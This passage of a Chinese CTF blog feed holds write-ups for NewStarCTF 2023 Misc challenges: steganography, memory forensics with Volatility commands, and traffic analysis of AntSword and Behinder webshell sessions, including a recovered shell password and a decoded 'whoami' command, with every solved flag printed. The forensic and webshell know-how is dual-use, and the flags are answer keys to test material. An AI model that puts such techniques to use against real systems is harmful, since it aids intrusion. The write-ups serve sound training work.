Horizon<br>\nGate，根据题目提示每张图片有两个 steg，猜测该图片另一个 steg 为 steghide</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/otBrdkDYbZXjex4Z.png!thumbnail\" alt=\"\"></p>\n<p>得到压缩包密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.*+#1Ao/aeS</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PkM3s8618LoivkCp.png!thumbnail\" alt=\"\"></p>\n<p>一看宽高就明显被修改过，CRC 爆破出正确的宽高</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n7OrB4bvgbjP1KLt.png!thumbnail\" alt=\"\"></p>\n<p>再次得到 key，K34-759183-191</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OeaaK08SxvgWDxlG.png!thumbnail\" alt=\"\"></p>\n<p>查看图片结构发现文件尾有冗余，猜测为 oursecret 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/43BvxtDZ1eGb99cY.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/izewk8EeWJoXXcgN.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，<strong>flag{A1l_boys_aRe_Jaeger_L0ver!!}</strong></p>\n<h2 id=\"steganography\"><a class=\"markdownIt-Anchor\" href=\"#steganography\">#</a> Steganography</h2>\n<p>在 careful.jpg 图片末尾发现一串 base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gKVJcwKeUDknpGrA.png!thumbnail\" alt=\"\"></p>\n<p>这题应该是算非预期出的，将输出作为掩码进行爆破，大概半小时左右，忘记截图了就不重新爆破一遍了，密码为 12ercsxqwed909jk</p>\n<p>解压得到 flag，<strong>flag{4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c}</strong></p>\n<h2 id=\"可爱的派蒙捏\"><a class=\"markdownIt-Anchor\" href=\"#可爱的派蒙捏\">#</a> 可爱的派蒙捏</h2>\n<p>分离图片出一个压缩包</p>\n<p>解压得到两个相似的文本 1.txt 和 2.txt</p>\n<p>用 winhex 的文件工具进行比较</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bZ99XTD0P17sqfse.png!thumbnail\" alt=\"\"></p>\n<p>保留差异第二列进行 16 进制转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">666C61677B34656266333237393035323838666361393437617D</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/H8MGubWrmaE9gMV2.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，<strong>flag{4ebf327905288fca947a}</strong></p>\n<h2 id=\"message\"><a class=\"markdownIt-Anchor\" href=\"#message\">#</a> message</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EkDKmacmuUjfF0Vi.png!thumbnail\" alt=\"\"></p>\n<p>16 进制转换得到 flag</p>\n<p><strong>SHCTF{ba978405-b1c8-847c-8e69-f62177e4c087}</strong></p>\n<h2 id=\"签到题\"><a class=\"markdownIt-Anchor\" href=\"#签到题\">#</a> <strong>签到题</strong></h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/t1ESyLiSCgPkr2Qh.png!thumbnail\" alt=\"\"></p>\n<p>两层 base64 得到 flag</p>\n<p><strong>flag{this_is_flag}</strong></p>\n<h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> <strong>WEEK2</strong></h1>\n<h2 id=\"远在天边近在眼前\"><a class=\"markdownIt-Anchor\" href=\"#远在天边近在眼前\">#</a> 远在天边近在眼前</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aWiPMzvlZd41xxn0.png!thumbnail\" alt=\"\"></p>\n<p>得到压缩包，从里到外拼接文件夹字符得到 flag</p>\n<p><strong>flag{TH15_1S_r3aIIY_eA5y_4LRi9Ht?_765786987fad}</strong></p>\n<h2 id=\"奇怪的screenshot\"><a class=\"markdownIt-Anchor\" href=\"#奇怪的screenshot\">#</a> 奇怪的 screenshot</h2>\n<p>得到截图</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ptmDLexzfR0KrPmh.png!thumbnail\" alt=\"\"></p>\n<p>winhex 查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fwXe3EWCT1B6g5dx.png!thumbnail\" alt=\"\"></p>\n<p>发现有两个图片尾，截图 cve，CVE-2023-28303</p>\n<p>使用工具还原</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8gRDuBU48XNpFS68.png!thumbnail\" alt=\"\"></p>\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">杨吕褚朱窦任云伍孙赵孙李伍孙冯李赵李伍袁尤张钱钱伍花张尤曹曹尤张朱伍魏赵赵吕伍尤金伍张赵魏伍花韩蒋陶华韩</span><br></pre></td></tr></table></figure>\n<p>百家姓解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aGU1V9FcX3tYFCIx.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，<strong>flag{CVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure}</strong></p>\n<h2 id=\"可爱的洛琪希\"><a class=\"markdownIt-Anchor\" href=\"#可爱的洛琪希\">#</a> 可爱的洛琪希</h2>\n<p>得到 jpg 的 base64 编码，解码之后保存为图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lbDsEUdtPdeCgYqz.png!thumbnail\" alt=\"\"></p>\n<p>在详细信息中找到编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NO6aZNZniBN0rjRC.png!thumbnail\" alt=\"\"></p>\n<p>图片末尾找到 key，nanian</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U55JFhRXaXynzsUL.png!thumbnail\" alt=\"\"></p>\n<p>16 进制解码，维吉尼亚解密得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bg5Qaocg7VnbLi2S.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Roxy_daisuki!}</strong></p>\n<h2 id=\"图片里的秘密\"><a class=\"markdownIt-Anchor\" href=\"#图片里的秘密\">#</a> 图片里的秘密</h2>\n<p>在图片末发现 rar 压缩包，手动分离出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/D0X86WBtiRNzcOXE.png!thumbnail\" alt=\"\"></p>\n<p>解压得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bNsm9bfPcLzt83Pc.png!thumbnail\" alt=\"\"></p>\n<p>根据题目提示盲水印猜测为 java 盲水印，水印工具提取得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VDj66MXIPIVn08mo.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Blind_Water_Mark!}</strong></p>\n<h2 id=\"表里的码\"><a class=\"markdownIt-Anchor\" href=\"#表里的码\">#</a> 表里的码</h2>\n<p>得到一个 zip 文件，根据题目提示发现是表格的压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zyc9zRFRTmHmOZeo.png!thumbnail\" alt=\"\"></p>\n<p>修改后缀为 xls 打开</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5M9xrCAoxcyE8Ruw.png!thumbnail\" alt=\"\"></p>\n<p>随便点点发现有些单元格字体是加粗的，将加粗单元格填充为黑色得到二维码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FqPBJ73JlvrEoZjT.png!thumbnail\" alt=\"\"></p>\n<p>扫码得到 flag，<strong>flag{j0k3r_1s_my_wif3}</strong></p>\n<h2 id=\"喜帖街\"><a class=\"markdownIt-Anchor\" href=\"#喜帖街\">#</a> 喜帖街</h2>\n<p>先放张图来阐述一下这个老知识点</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FbA4soOP1hTsNTLV.png!thumbnail\" alt=\"\"></p>\n<p>原理就是利用声波干涉消除原声得到想要的音频</p>\n<p>附件得到 wav 音频，听了下发现有杂音，想到了反相相消，这里在网上下载了原曲，使用 au 进行反相</p>\n<p>首先导入两个音频创建多轨并拖入</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Qr8sQXvUiDOpreme.png!thumbnail\" alt=\"\"></p>\n<p>当弹出采样率不匹配时点击确定使它自动转换成相同的采样率</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uEkNudRZ4Tf5otxx.png!thumbnail\" alt=\"\"></p>\n<p>拉大将音轨对齐</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gZrlFUcjENRGZgIA.png!thumbnail\" alt=\"\"></p>\n<p>再双击原曲也就是上图所示紫色部分，全选之后点击效果中的反相</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9iUgJhnGzeYdXyhj.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/849RF8f5dBT8rEG6.png!thumbnail\" alt=\"\"></p>\n<p>回看多轨能发现波峰正好对应上波谷，实现相消</p>\n<p>导出多轨重新放入 au 中查看频谱图</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VWsag0y9SQx90b2R.png!thumbnail\" alt=\"\"></p>\n<p>频谱图上发现了一串字符串 LeeTung，作为 key 来解音频隐写，尝试 deepsound 和 silenteye 都不是，这里也是一个比较老的知识点，wav 的 steghide 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LbDMr4x49wQ5HLIV.png!thumbnail\" alt=\"\"></p>\n<p>文本中得到 ook 编码，解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Q7TAUvUEBKFcgDNr.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zaf9yOtGxWmG5FSP.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{w@v2txt_s0_Int3r3st1ng!}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK5/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK5/",
            "title": "NewStarCTF2023Misc week5",
            "date_published": "2024-04-16T05:58:19.015Z",
            "content_html": "<h1 id=\"week5\"><a class=\"markdownIt-Anchor\" href=\"#week5\">#</a> <strong>WEEK5</strong></h1>\n<h2 id=\"隐秘的图片\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的图片\">#</a> 隐秘的图片</h2>\n<p>解压附件，得到 key1，key2 两张图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YGcEbbu12NsSNUD9.png!thumbnail\" alt=\"\"></p>\n<p>key1 扫出来并不是 flag</p>\n<p>大致看了下，发现 key2 很奇怪，并不像拼接定位点，而黑白两部分并不需要 xor</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/myep5P3UAZl2W8dk.png!thumbnail\" alt=\"\"></p>\n<p>两张图片的大小是相同的，所以猜测一下使用 stegsolve 进行合并</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/chJDGvOGReext6uK.png!thumbnail\" alt=\"\"></p>\n<p>xor 得到完整二维码。扫码得到 flag</p>\n<p><strong>flag{x0r_1m4ge_w1ll_g0t_fl4ggg_3394e4ecbb53}</strong></p>\n<h2 id=\"ezhard\"><a class=\"markdownIt-Anchor\" href=\"#ezhard\">#</a> ezhard</h2>\n<p>是一道磁盘取证题，这题我没用别的工具就单用了 winhex</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/b2DnQBCemRwg8d9R.png!thumbnail\" alt=\"\"></p>\n<p>发现 lost+found 处有 flag 和 hint.png，于是用 binwalk 对文件进行分离</p>\n<p>能直接在 hint.png 获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UeODlBCxl8SzaGE5.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{12bc2ba3-fa54-7b45-7f3d-f54ea6e45d7c}</strong></p>\n<h2 id=\"新建python文件\"><a class=\"markdownIt-Anchor\" href=\"#新建python文件\">#</a> 新建 Python 文件</h2>\n<p>当时第一次看题的时候第一反应就是反编译，结果没有什么发现，就是一个普通的脚本</p>\n<p>这题的考点在于剑龙隐写（stegosaurus），也是比较老的一个考点了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FuZ2VsS2l0dHkvc3RlZ29zYXVydXM=\">https://github.com/AngelKitty/stegosaurus</span></p>\n<p>这题对 python 的版本好像有一定的要求，需要 3.6 的环境，本机是 3.1 的所以当时跑了下直接报错也就没再返回看了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uC42SmtK3PJXdYdM.png!thumbnail\" alt=\"\"></p>\n<p>跑一下就能出</p>\n<p><strong>flag{s0_b4By_pYcst3g}</strong></p>\n<h2 id=\"babyantsword\"><a class=\"markdownIt-Anchor\" href=\"#babyantsword\">#</a> BabyAntSword</h2>\n<p>看题目就知道是蚁剑的流量题</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OsYZoVejKJVK48yJ.png!thumbnail\" alt=\"\"></p>\n<p>无非就是解密请求包与回显包，先看看流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wAMgdNAILEWyqdZX.png!thumbnail\" alt=\"\"></p>\n<p>在第 31 流开始明显出现了蚁剑 webshell 的流量特征</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UNm9JrvaVx96sjSx.png!thumbnail\" alt=\"\"></p>\n<p>在第 36 流出现了命令执行语句，并且多出了第二个字段，参数为 n3wst4r</p>\n<p>这便是 webshell 的密码</p>\n<p>而执行的命令解码便知道是 whoami</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pMEpy2peT2OA5lxp.png!thumbnail\" alt=\"\"></p>\n<p>第 39 流的回显明显较多，去除头尾解码查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/apZqxqvyy5xBlENE.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Dz2ZPUxPBV9iv2wv.png!thumbnail\" alt=\"\"></p>\n<p>在这里找到了 java 的版本</p>\n<p>在解码 43 流回包时发现了一个 uuid，猜测为需要寻找的最后一个信息，去查看下请求包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/r7Rk18vo68DVrLop.png!thumbnail\" alt=\"\"></p>\n<p>发现文件名称为 secret，再查看下下个流的请求包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/juUJXaaKGTd783U4.png!thumbnail\" alt=\"\"></p>\n<p>发现把该文件删除了，确定了这便是需要寻找的内容，拼接得到 flag</p>\n<p><strong>flag{n3wst4r_7u121_c5850a0c-dc03-1db2-4303-43d6fdf27985}</strong></p>\n<h2 id=\"easymem\"><a class=\"markdownIt-Anchor\" href=\"#easymem\">#</a> Easymem</h2>\n<p>是一道平时比较常见知识点的内存取证题，这里用到工具 vol2，PasswareKitForensic 和 gimp</p>\n<p>先用 imageinfo 查看类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw imageinfo</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wC7ms9O3Wx2nSkC1.png!thumbnail\" alt=\"\"></p>\n<p>再查找名称带有 flag 字段的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 filescan | findstr flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mckm3NA1bVMwHDb1.png!thumbnail\" alt=\"\"></p>\n<p>发现桌面上有个 flag2.txt，给它 dump 下来得到第二段 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ed627e0 -D ./</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mXDfJ0c4Bh1r96gc.png!thumbnail\" alt=\"\"></p>\n<p>83-5032-1056-</p>\n<p>接着使用 PasswareKitForensic 去爆破用户密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EPG5LcH8xbmT5LS9.png!thumbnail\" alt=\"\"></p>\n<p>可以得到 ctf 用户的密码为第一段 flag，flag {45a527fb-2f</p>\n<p>接着还剩最后一段 flag，根据前面几周的经验，notepad 和 editbox 都查看了，发现没有东西，去看看画板的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 pslist | findstr mspaint</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ahq7VTHHAQ0iNycd.png!thumbnail\" alt=\"\"></p>\n<p>先找到画板的进程号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 memdump -p 1484 --dump-dir=./</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lA55hifHb2Wz9LJr.png!thumbnail\" alt=\"\"></p>\n<p>接着使用 memdump，dump 它内存进程的转储文件，得到 1484.dmp，改后缀为 data 拖入 gimp 固定好常用宽高拉取位移使图像清晰可见</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jNwgUu1TnZG6yQ7K.png!thumbnail\" alt=\"\"></p>\n<p>得到最后一段 flag，这里可以切换高度和宽度重新位移试试，我这里的数据得到的就是镜像图片，在线网站翻转一下就能看了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jJHGlE31jeJ1EhK7.png!thumbnail\" alt=\"\"></p>\n<p>拼接得到完整 flag</p>\n<p><strong>flag{45a527fb-2f83-5032-1056-0b949b63a947}</strong></p>\n<h2 id=\"enigma\"><a class=\"markdownIt-Anchor\" href=\"#enigma\">#</a> Enigma</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install py-enigma</span><br></pre></td></tr></table></figure>\n<p>这题没做出来，附上官方脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from enigma.machine import EnigmaMachine</span><br><span class=\"line\">reflectors = [&#x27;B-Thin&#x27;, &#x27;C-Thin&#x27;]</span><br><span class=\"line\">rotors = [&#x27;I&#x27;, &#x27;II&#x27;, &#x27;III&#x27;, &#x27;IV&#x27;, &#x27;V&#x27;, &#x27;VI&#x27;, &#x27;VII&#x27;, &#x27;VIII&#x27;]</span><br><span class=\"line\">for r1, r2, r3 in [(r1, r2, r3) for r1 in rotors for r2 in rotors for r3 in rotors]:</span><br><span class=\"line\">    for r in reflectors:</span><br><span class=\"line\">        for a, b in [(a, b) for a in range(1, 26) for b in range(1, 26)]:</span><br><span class=\"line\">            machine = EnigmaMachine.from_key_sheet(</span><br><span class=\"line\">                rotors=&#x27; &#x27;.join([r1, r2, r3]),</span><br><span class=\"line\">                reflector=r,</span><br><span class=\"line\">                ring_settings=[a, 15, b],</span><br><span class=\"line\">                plugboard_settings=&#x27;&#x27;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            temp = machine.process_text(&#x27;uwdhwalkbuzwewhcaaepxnqsvfvkohskkspolrnswdfcbnn&#x27;)</span><br><span class=\"line\">            if temp.startswith(&quot;FLAG&quot;):</span><br><span class=\"line\">                print(temp, r1, r2, r3, r)</span><br><span class=\"line\">                break</span><br></pre></td></tr></table></figure>\n<p>去了解了一下 enigma 是二战时期的德国密码机，其实只要知道本题中有几个未知的加密参数：reflector、rotors 和 rs1、rs2，去根据他们原有的范围编写脚本爆破密文即可<br>\n得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/so7EtI1kKl0NRt3U.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{ENIGMAISSOOOINTERESTINGCRYPTODOYOUTHINKSO}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK4/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK4/",
            "title": "NewStarCTF2023Misc week4",
            "date_published": "2024-04-16T05:58:19.013Z",
            "content_html": "<h1 id=\"week4\"><a class=\"markdownIt-Anchor\" href=\"#week4\">#</a> <strong>WEEK4</strong></h1>\n<h2 id=\"r通大残\"><a class=\"markdownIt-Anchor\" href=\"#r通大残\">#</a> R 通大残</h2>\n<p>题目描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">R通大残，打了99，补！</span><br></pre></td></tr></table></figure>\n<p>解压附件得到是一张 png，根据题目描述，猜测是有关 rgb 通道的考点，用 zsteg 一把梭了<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hD5ixSfUAJgiwhBU.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{a96d2cc1-6edd-47fb-8e84-bd953205c9f5}</strong></p>\n<h2 id=\"nmap\"><a class=\"markdownIt-Anchor\" href=\"#nmap\">#</a> Nmap</h2>\n<p>题目描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">请给出Nmap扫描得到所有的开放端口用英文逗号分隔，端口号从小到大排列。 例如flag&#123;21,22,80,8080&#125;</span><br></pre></td></tr></table></figure>\n<p>打开流量包<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wNo7GIiJovL3jdvx.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>发现源 ip 和目标 ip 都是 127.0.0.1，自己扫自己</p>\n<p>因为是 nmap 进行的扫描，所以根据 tcp 三次握手的原理编辑语句进行过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.dst == 127.0.0.1 and tcp.connection.synack</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7h9jWzsDV5KYNPHg.png!thumbnail\" alt=\"\"></p>\n<p>这里便是所有的开放端口了</p>\n<p><strong>flag{80,3306,5000,7000,8021,9000}</strong></p>\n<h2 id=\"3-溯源\"><a class=\"markdownIt-Anchor\" href=\"#3-溯源\">#</a> 3 - 溯源</h2>\n<p>题目描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在调查清楚攻击者的攻击路径后你暗暗松了一口气，但是攻击者仍控制着服务器，眼下当务之急是继续深入调查攻击者对服务器进行了什么操作，同时调查清楚攻击者的身份，请你分析攻击者与WebShell通讯的流量获取攻击者获取的相关信息，目前可以得知的是攻击者使用了冰蝎进行WebShell连接。 Tip：沿着前序题目的进度分析会更符合逻辑，或许有助于解题 FLAG格式：flag&#123;攻击者获取到的服务器用户名_服务器内网IP地址&#125; 例如flag&#123;web_10.0.0.3&#125;</span><br></pre></td></tr></table></figure>\n<p>能得到的信息有：分析 webshell 流量，需要找到用户名和内网 ip<br>\n 附件显示为冰蝎流量，而且流量包很杂，很多都是扫描流量，要解码冰蝎首要的就是找到 key</p>\n<p>搜索 shell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ez5MvTaUwrmptWMN.png!thumbnail\" alt=\"\" title=\"fig:\">能看到这里进行了命令执行把一句话写入了 shell.php，但并不是我们需要的冰蝎马</p>\n<p>继续往下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ff6D7tFjgkb2Uwsf.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MaGFJTmNOvQ8y3eh.png!thumbnail\" alt=\"\"></p>\n<p>在这里追踪到了通过一句话木马上传冰蝎马的操作，并命名为 1.php</p>\n<p>解码请求包就能看到冰蝎马，得到 key</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1aT9dyHVLW0C6b5o.png!thumbnail\" alt=\"\"></p>\n<p>接下来就是解密通讯流量了</p>\n<p>在流 5738 解密回包得到 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JwWO0gikotIddqOP.png!thumbnail\" alt=\"\"></p>\n<p>在流 5735 解密第三个回包得到用户名</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c9fqZ1VYApAMLxSO.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{www-data_172.17.0.2}</strong></p>\n<h2 id=\"依旧是空白\"><a class=\"markdownIt-Anchor\" href=\"#依旧是空白\">#</a> 依旧是空白</h2>\n<p>拿到附件利用文本直接跑 whitespace，跑不出</p>\n<p>回看 png，crc 爆破宽高</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vXuTE94wTZhoqnkR.png!thumbnail\" alt=\"\"></p>\n<p>修改高度为原先的 1044，得到密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nAoNXVj2XSIb3l8F.png!thumbnail\" alt=\"\"></p>\n<p>题目提示这次的空白格不太一样，并且已经找到了一个 pass，猜测 snow 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WEiL1SesayPAZllp.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{2b29e3e0-5f44-402b-8ab3-35548d7a6a11}</strong></p>\n<h2 id=\"第一次取证\"><a class=\"markdownIt-Anchor\" href=\"#第一次取证\">#</a> 第一次取证</h2>\n<p>给了 raw 文件，内存取证，利用工具 volatility</p>\n<p>先分析操作系统</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/t1lybfHjYt2Pbe3V.png!thumbnail\" alt=\"\"></p>\n<p>接着去找了一圈 file，发现没有找到有用信息，于是去看了下 notepad 和 editbox 内容</p>\n<p>最终在 editbox 找到了编码后的 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f dycqz.raw --profile=Win7SP1x64 editbox</span><br></pre></td></tr></table></figure>\n<p><img 